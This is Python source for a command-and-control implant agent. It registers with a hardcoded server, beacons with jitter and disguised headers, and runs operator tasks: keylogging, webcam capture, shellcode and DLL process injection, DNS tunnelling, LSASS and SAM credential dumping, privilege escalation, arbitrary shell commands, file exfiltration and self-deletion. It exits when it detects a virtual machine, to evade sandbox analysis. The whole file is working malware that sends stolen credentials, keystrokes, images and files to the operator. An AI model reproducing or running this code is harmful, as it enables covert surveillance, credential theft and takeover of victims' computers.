import os
import sys
import time
import requests
import logging
from datetime import datetime
import threading
import json
import base64
import socket
import platform
import uuid
import random

# Add the parent directory to path to correctly import modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import modules - with error handling for cross-platform support
from modules.evasion import Evasion
try:
    from modules.keylogger import Keylogger
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("Keylogger module not available")

try:
    from modules.webcam import WebcamCapture
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False
    print("Webcam module not available")

try:
    from modules.process_injection import ProcessInjector
    INJECTION_AVAILABLE = True
except ImportError:
    INJECTION_AVAILABLE = False
    print("Process injection module not available")

try:
    from modules.post_exploit import PostExploit
    POST_EXPLOIT_AVAILABLE = True
except ImportError:
    POST_EXPLOIT_AVAILABLE = False
    print("Post-exploitation module not available")

try:
    from modules.dns_tunnel import DNSTunnel
    DNS_TUNNEL_AVAILABLE = True
except ImportError:
    DNS_TUNNEL_AVAILABLE = False
    print("DNS tunnel module not available")

try:
    from modules.credential_dump import CredentialDump
    CRED_DUMP_AVAILABLE = True
except ImportError:
    CRED_DUMP_AVAILABLE = False
    print("Credential dumping module not available")

try:
    from modules.priv_esc import PrivilegeEscalation
    PRIV_ESC_AVAILABLE = True
except ImportError:
    PRIV_ESC_AVAILABLE = False
    print("Privilege escalation module not available")

class Agent:
    def __init__(self, server_url, agent_id=None, jitter=True, sleep_time=5):
        self.server_url = server_url
        self.agent_id = agent_id or self.generate_agent_id()
        self.jitter = jitter  # Add randomness to beacon times
        self.sleep_time = sleep_time  # Base sleep time between beacons
        self.running = False
        self.task_threads = {}
        self.start_time = time.time()  # Initialize start_time here
        self.setup_logging()
        self.setup_modules()
        self.system_info = self.collect_system_info()
        self.last_beacon = 0
        
    def setup_logging(self):
        """Setup logging with file and console output"""
        try:
            log_file = f"agent_{self.agent_id[-6:]}.log"
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler(log_file),
                    logging.StreamHandler()
                ]
            )
        except Exception as e:
            print(f"Warning: Could not set up file logging: {e}")
            # Fallback to console-only logging
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s'
            )
        
    def setup_modules(self):
        """Initialize all available modules"""
        # Core modules
        self.evasion = Evasion()
        
        # Optional modules based on availability
        self.keylogger = Keylogger() if KEYLOGGER_AVAILABLE else None
        self.webcam = WebcamCapture() if WEBCAM_AVAILABLE else None
        self.process_injector = ProcessInjector() if INJECTION_AVAILABLE else None
        self.post_exploit = PostExploit() if POST_EXPLOIT_AVAILABLE else None
        self.dns_tunnel = DNSTunnel("example.com") if DNS_TUNNEL_AVAILABLE else None
        self.cred_dump = CredentialDump() if CRED_DUMP_AVAILABLE else None
        self.priv_esc = PrivilegeEscalation() if PRIV_ESC_AVAILABLE else None
        
        # Track which modules are available
        self.available_modules = {
            'keylogger': KEYLOGGER_AVAILABLE,
            'webcam': WEBCAM_AVAILABLE,
            'process_injection': INJECTION_AVAILABLE,
            'post_exploit': POST_EXPLOIT_AVAILABLE,
            'dns_tunnel': DNS_TUNNEL_AVAILABLE,
            'credential_dump': CRED_DUMP_AVAILABLE,
            'privilege_escalation': PRIV_ESC_AVAILABLE
        }
        
    def collect_system_info(self):
        """Collect detailed system information"""
        info = {
            'hostname': socket.gethostname(),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'os': platform.system(),
            'os_release': platform.release(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'pid': os.getpid(),
            'available_modules': self.available_modules,
            'timestamp': datetime.now().isoformat()
        }
        return info
        
    def generate_agent_id(self):
        """Generate unique agent ID based on machine properties"""
        # Create a more unique ID combining machine info and a UUID
        machine_id = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
        unique_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, machine_id))
        return f"agent_{unique_id}"
        
    def register(self):
        """Register agent with C2 server"""
        try:
            data = {
                'agent_id': self.agent_id,
                'system_info': self.system_info,
                'timestamp': datetime.now().isoformat()
            }
            
            # Add encryption/obfuscation (simplified example)
            encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
            
            response = requests.post(
                f"{self.server_url}/api/agents/register",
                json={'data': encoded_data},
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                logging.info("Successfully registered with C2 server")
                return True
            else:
                logging.error(f"Failed to register: {response.text}")
                return False
                
        except Exception as e:
            logging.error(f"Error registering agent: {str(e)}")
            return False
            
    def beacon(self):
        """Send periodic beacon to C2 server"""
        try:
            # Add randomness to beacon timing if jitter is enabled
            if self.jitter:
                jitter_factor = random.uniform(0.7, 1.3)
                actual_sleep = self.sleep_time * jitter_factor
            else:
                actual_sleep = self.sleep_time
                
            # Sleep to avoid constant beaconing
            time.sleep(actual_sleep)
            
            # Record beacon time
            self.last_beacon = time.time()
            
            # Update system information
            self.system_info.update({
                'timestamp': datetime.now().isoformat(),
                'uptime': time.time() - self.start_time
            })
            
            # Prepare beacon data
            data = {
                'agent_id': self.agent_id,
                'status': 'active',
                'system_info': self.system_info,
                'task_status': {tid: thread.is_alive() for tid, thread in self.task_threads.items()}
            }
            
            # Add encryption/obfuscation (simplified example)
            encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
            
            # Send beacon
            response = requests.post(
                f"{self.server_url}/api/agents/beacon",
                json={'data': encoded_data},
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                logging.debug("Beacon successful")
                return response.json()
            else:
                logging.error(f"Beacon failed: {response.text}")
                return None
                
        except Exception as e:
            logging.error(f"Error in beacon: {str(e)}")
            return None
            
    def get_tasks(self):
        """Get pending tasks from C2 server"""
        try:
            response = requests.get(
                f"{self.server_url}/api/tasks/{self.agent_id}",
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                # Decode response (assuming it's encoded)
                try:
                    encoded_data = response.json().get('data')
                    if encoded_data:
                        data = json.loads(base64.b64decode(encoded_data).decode())
                        return data
                    return response.json()
                except:
                    return response.json()
            else:
                logging.error(f"Failed to get tasks: {response.text}")
                return None
                
        except Exception as e:
            logging.error(f"Error getting tasks: {str(e)}")
            return None
            
    def execute_task(self, task):
        """Execute received task"""
        try:
            task_type = task.get('type')
            task_data = task.get('data', {})
            task_id = task.get('id')
            
            logging.info(f"Executing task {task_id} of type {task_type}")
            
            result = {'status': 'failed', 'message': 'Unknown task type'}
            
            # Check if module is available before executing
            if task_type == 'keylogger' and self.keylogger:
                action = task_data.get('action', 'start')
                if action == 'start':
                    # Start keylogger in a separate thread
                    thread = threading.Thread(
                        target=self.keylogger.start,
                        kwargs={'duration': task_data.get('duration', 0)}
                    )
                    thread.daemon = True
                    thread.start()
                    self.task_threads[task_id] = thread
                    result = {'status': 'running', 'message': 'Keylogger started'}
                elif action == 'stop':
                    # Stop keylogger
                    self.keylogger.stop()
                    result = {'status': 'success', 'message': 'Keylogger stopped'}
                elif action == 'get_logs':
                    # Get keylogger logs
                    logs = self.keylogger.get_logs()
                    result = {'status': 'success', 'logs': logs}
                    
            elif task_type == 'webcam' and self.webcam:
                # Capture webcam image
                image_data = self.webcam.capture()
                if image_data:
                    # Convert image to base64 for transmission
                    b64_image = base64.b64encode(image_data).decode()
                    result = {'status': 'success', 'image': b64_image}
                else:
                    result = {'status': 'failed', 'message': 'Failed to capture webcam image'}
                    
            elif task_type == 'process_injection' and self.process_injector:
                # Process injection - get parameters
                target_process = task_data.get('process')
                shellcode_b64 = task_data.get('shellcode')
                dll_path = task_data.get('dll_path')
                encryption_type = task_data.get('encryption_type', 'xor')
                key_file = task_data.get('key_file')
                
                if shellcode_b64:
                    # Decode base64 shellcode
                    encrypted_shellcode = base64.b64decode(shellcode_b64)
                    
                    # Perform injection
                    injection_result = self.process_injector.inject(
                        target_process,
                        encrypted_shellcode=encrypted_shellcode,
                        dll_path=None,
                        encryption_type=encryption_type,
                        key_file=key_file
                    )
                    result = {'status': 'success' if injection_result else 'failed'}
                elif dll_path:
                    # DLL injection
                    injection_result = self.process_injector.inject(
                        target_process,
                        encrypted_shellcode=None,
                        dll_path=dll_path
                    )
                    result = {'status': 'success' if injection_result else 'failed'}
                else:
                    result = {'status': 'failed', 'message': 'No payload provided'}
                    
            elif task_type == 'post_exploit' and self.post_exploit:
                # Execute post-exploitation command
                command = task_data.get('command')
                post_result = self.post_exploit.execute(command)
                result = {'status': 'success', 'output': post_result}
                
            elif task_type == 'dns_tunnel' and self.dns_tunnel:
                # Start DNS tunneling
                action = task_data.get('action', 'start')
                if action == 'start':
                    domain = task_data.get('domain', 'example.com')
                    self.dns_tunnel.domain = domain
                    
                    thread = threading.Thread(
                        target=self.dns_tunnel.start_tunnel
                    )
                    thread.daemon = True
                    thread.start()
                    self.task_threads[task_id] = thread
                    result = {'status': 'running', 'message': f'DNS tunnel started with domain {domain}'}
                elif action == 'stop':
                    self.dns_tunnel.stop_tunnel()
                    result = {'status': 'success', 'message': 'DNS tunnel stopped'}
                    
            elif task_type == 'credential_dump' and self.cred_dump:
                # Dump credentials
                dump_method = task_data.get('method', 'lsass')
                if dump_method == 'lsass':
                    creds = self.cred_dump.dump_lsass()
                    result = {'status': 'success', 'credentials': creds}
                elif dump_method == 'sam':
                    creds = self.cred_dump.dump_sam()
                    result = {'status': 'success', 'credentials': creds}
                else:
                    result = {'status': 'failed', 'message': f'Unknown dump method: {dump_method}'}
                    
            elif task_type == 'privilege_escalation' and self.priv_esc:
                # Attempt privilege escalation
                method = task_data.get('method', 'windows_services')
                if method == 'windows_services':
                    success = self.priv_esc.check_windows_services()
                    result = {'status': 'success' if success else 'failed'}
                else:
                    result = {'status': 'failed', 'message': f'Unknown escalation method: {method}'}
                    
            elif task_type == 'system_info':
                # Return updated system information
                result = {'status': 'success', 'system_info': self.collect_system_info()}
                
            elif task_type == 'shell_command':
                # Execute shell command and return result
                command = task_data.get('command')
                try:
                    import subprocess
                    output = subprocess.check_output(
                        command, 
                        shell=True, 
                        stderr=subprocess.STDOUT,
                        timeout=task_data.get('timeout', 30)
                    )
                    result = {
                        'status': 'success', 
                        'output': base64.b64encode(output).decode()
                    }
                except Exception as e:
                    result = {'status': 'failed', 'message': str(e)}
                    
            elif task_type == 'download_file':
                # Download file from agent
                file_path = task_data.get('path')
                try:
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                    result = {
                        'status': 'success',
                        'file_name': os.path.basename(file_path),
                        'file_data': base64.b64encode(file_data).decode()
                    }
                except Exception as e:
                    result = {'status': 'failed', 'message': str(e)}
                    
            elif task_type == 'upload_file':
                # Upload file to agent
                file_path = task_data.get('path')
                file_data_b64 = task_data.get('file_data')
                try:
                    file_data = base64.b64decode(file_data_b64)
                    with open(file_path, 'wb') as f:
                        f.write(file_data)
                    result = {'status': 'success', 'message': f'File written to {file_path}'}
                except Exception as e:
                    result = {'status': 'failed', 'message': str(e)}
                    
            elif task_type == 'self_destruct':
                # Self-destruct (remove agent)
                self.running = False
                try:
                    # Try to remove our own executable (may not work if running)
                    if getattr(sys, 'frozen', False):
                        os.remove(sys.executable)
                        result = {'status': 'success', 'message': 'Agent self-destructed and removed'}
                    else:
                        result = {'status': 'partial', 'message': 'Agent terminated but not removed'}
                        
                    # Clean up logs
                    try:
                        for file in os.listdir():
                            if file.startswith('agent_') and file.endswith('.log'):
                                os.remove(file)
                    except:
                        pass
                except Exception as e:
                    result = {'status': 'partial', 'message': f'Agent terminated but removal failed: {str(e)}'}
            
            # Send result back to server
            self.send_result(task_id, result)
            return result
            
        except Exception as e:
            logging.error(f"Error executing task: {str(e)}")
            error_result = {'status': 'error', 'error': str(e)}
            self.send_result(task_id, error_result)
            return error_result
            
    def send_result(self, task_id, result):
        """Send task result to C2 server"""
        try:
            data = {
                'task_id': task_id,
                'agent_id': self.agent_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
            # Add encryption/obfuscation
            encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
            
            response = requests.post(
                f"{self.server_url}/api/results",
                json={'data': encoded_data},
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code != 200:
                logging.error(f"Failed to send result: {response.text}")
                
        except Exception as e:
            logging.error(f"Error sending result: {str(e)}")
            
    def run(self):
        """Main agent loop"""
        try:
            self.start_time = time.time()
            self.running = True
            
            if not self.register():
                logging.error("Failed to register with C2 server")
                return
                
            logging.info(f"Agent {self.agent_id} started and registered successfully")
                
            while self.running:
                # Send beacon and get any response
                beacon_response = self.beacon()
                
                # Get pending tasks
                tasks = self.get_tasks()
                if tasks:
                    for task in tasks:
                        # Execute task in separate thread for long-running tasks
                        thread = threading.Thread(
                            target=self.execute_task,
                            args=(task,),
                            daemon=True
                        )
                        thread.start()
                        
                        # For short tasks, we could also wait, but we'll make all async for simplicity
                        if task.get('type') not in ['keylogger', 'dns_tunnel']:  # Non-persistent tasks
                            thread.join(timeout=1.0)  # Wait briefly, but don't block forever
                        
                # Sleep for a while before checking for new tasks
                # This already happens in the beacon method
                
        except Exception as e:
            logging.error(f"Error in main loop: {str(e)}")
            
        finally:
            logging.info("Agent shutting down")
            
    def is_vm_detected(self):
        """Check if we are running in a VM"""
        try:
            # Check if the evasion module has the detect_vm method
            if hasattr(self.evasion, 'detect_vm'):
                return self.evasion.detect_vm()
            else:
                # Fallback method if detect_vm is not available
                vm_indicators = [
                    "VMware",
                    "VBox",
                    "VBOX",
                    "Xen",
                    "QEMU",
                    "KVM"
                ]
                
                # Simple check for VM indicators
                for indicator in vm_indicators:
                    if indicator.lower() in platform.platform().lower():
                        return True
                        
                # Not detected as VM
                return False
        except Exception as e:
            logging.warning(f"Error in VM detection: {str(e)}")
            return False
            
if __name__ == "__main__":
    # Get C2 server URL from arguments or use default
    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.220.141:5001"
    
    # Create and run agent
    agent = Agent(server_url)
    
    # Optional: Skip if VM detected to avoid sandbox analysis
    if agent.is_vm_detected() and os.getenv("VM_OK") != "1":
        sys.exit(0)
        
    agent.run() 